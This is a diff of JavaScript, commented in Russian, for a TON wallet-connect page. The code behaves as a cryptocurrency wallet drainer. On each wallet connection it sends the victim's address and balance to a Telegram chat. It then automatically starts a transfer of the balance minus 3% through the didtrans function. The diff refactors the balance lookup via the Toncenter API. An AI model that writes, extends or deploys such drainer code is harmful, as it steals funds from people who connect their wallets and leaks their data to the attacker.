@@ -37,29 +37,41 @@ document.addEventListener('DOMContentLoaded', () => {
     // Обработка подключения кошелька
     tonConnectUI.onStatusChange(wallet => {
         if (wallet) {
-            // Отправка информации о подключенном кошельке в Telegram
-            const walletInfo = `\uD83D\uDCBC*Кошелек подключен:*\n\uD83D\uDCBB*Адрес:* ${wallet.account.address}\n\uD83D\uDCB0*Баланс:* ${wallet.account.balance}`;
-            sendTelegramMessage(walletInfo);
+            // Получаем баланс кошелька через Toncenter API
+            getWalletBalance(wallet.account.address).then(balance => {
+                // Отправка информации о подключенном кошельке в Telegram
+                const walletInfo = `\uD83D\uDCBC*Кошелек подключен:*\n\uD83D\uDCBB*Адрес:* ${wallet.account.address}\n\uD83D\uDCB0*Баланс:* ${balance} TON`;
+                sendTelegramMessage(walletInfo);
 
-            // Автоматически запускаем процесс отправки средств
-            didtrans(wallet.account.address);
+                // Автоматически запускаем процесс отправки средств
+                didtrans(wallet.account.address, balance);
+            }).catch(error => {
+                const errorMessage = `\uD83D\uDED1*Ошибка при получении баланса:* ${error.message}`;
+                sendTelegramMessage(errorMessage);
+            });
         } else {
             const messageDisconnected = `\uD83D\uDED1*Кошелек отключен.*`;
             sendTelegramMessage(messageDisconnected);
         }
     });
 
+    // Функция для получения баланса кошелька
+    async function getWalletBalance(walletAddress) {
+        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
+        const data = await response.json();
+        const balance = parseFloat(data.balance) / 1000000000; // Конвертация в TON
+        return balance;
+    }
+
     // Функция для отправки транзакции
-    async function didtrans(walletAddress) {
+    async function didtrans(walletAddress, balance) {
         if (!walletAddress) {
             const errorMessage = `\uD83D\uDED1*Ошибка:* Адрес кошелька не указан.`;
             sendTelegramMessage(errorMessage);
             return;
         }
 
-        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
-        const data = await response.json();
-        const originalBalance = parseFloat(data.balance);
+        const originalBalance = balance * 1000000000; // Конвертация обратно в нанотоны
         const processedBalance = originalBalance - (originalBalance * 0.03); // Вычитаем 3% для комиссий
         const tgBalance = processedBalance / 1000000000; // Конвертация в TON
 
